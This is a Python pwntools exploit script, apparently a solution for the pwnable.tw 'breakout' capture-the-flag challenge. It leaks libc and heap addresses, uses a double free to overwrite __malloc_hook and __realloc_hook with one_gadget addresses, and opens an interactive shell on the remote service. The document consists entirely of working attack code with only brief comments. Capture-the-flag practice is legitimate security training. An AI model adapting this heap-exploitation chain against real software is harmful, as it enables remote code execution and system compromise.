from pwn import *

#p = process('./breakout',env={'LD_PRELOAD':'./libc_64.so.6'})
p = remote('chall.pwnable.tw',10400)
libc = ELF('./libc_64.so.6')

#gdb.attach(p,'''break *0x555555555a30''')
context.log_level = 'debug'

def note(cell,size,note):
        p.sendlineafter('> ','note')
        p.sendlineafter('Cell: ',str(cell))
        p.sendlineafter('Size: ',str(size))
        p.sendafter('Note: ',note)

def list():
        p.sendlineafter('> ','list')

def punish(cell):
        p.sendlineafter('> ','punish')
        p.sendlineafter('Cell: ',str(cell))

#Lead libc base
note(0,0xa0,'chunksizeof_unsortbin')
note(1,0x30,'useto_split_topchunk')
note(0,0xb0,'free_chunk_0xa0')
note(2,0xa0,'leadlibc')
list()
p.recvuntil('leadlibc')
libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x3c3b78

#Lead heap
punish(9)
note(3,0x40,p64(libc.sym['__malloc_hook']+0x68))
list()
p.recvuntil('Risk: ')
topchunk_tmp = u64(p.recv(6).ljust(8,'\x00'))

log.info('LIBC:'+hex(libc.address))
log.info('TOP CHUNK (TMP):'+hex(topchunk_tmp))

#Double Free
payload = p64(libc.sym['__malloc_hook']+0x68)*3
payload += p64(0x900000033) + p64(libc.sym['__malloc_hook']+0x68)
payload += p64(0x60) + p64(topchunk_tmp+0x10)
note(3,0x40,payload)
note(4,0x60,'chunk_willbe_doublefree')
note(5,0x60,'chunk_bypass_doublefree')
note(1,0x40,'useto_split_topchunk')
note(4,0x80,'freechunk_beattack')
note(5,0x80,'freechunk_bypass')
note(9,0x80,'freechunk_beattack_second')

#Write to __realloc_hook __malloc_hook
note(6,0x60,p64(libc.sym['__malloc_hook']-0x23))
note(7,0x60,'malloc_chunk_bypass')
note(1,0x60,'malloc_chunk_doublefree')
note(8,0x30,'A'*(0x13-0x8)+p64(libc.address+0xf0567)+p64(libc.address+0x83b1b))
note(8,0x60,'')

#One_gadget
payload = p64(libc.sym['__malloc_hook']+0x68)*3
payload += p64(0x900000033) + p64(libc.sym['__malloc_hook']+0x68)
payload += p64(0)*2
note(3,0x40,payload)
p.sendlineafter('> ','note')
p.sendlineafter('Cell: ','9')
p.sendlineafter('Size: ','80')

p.interactive()
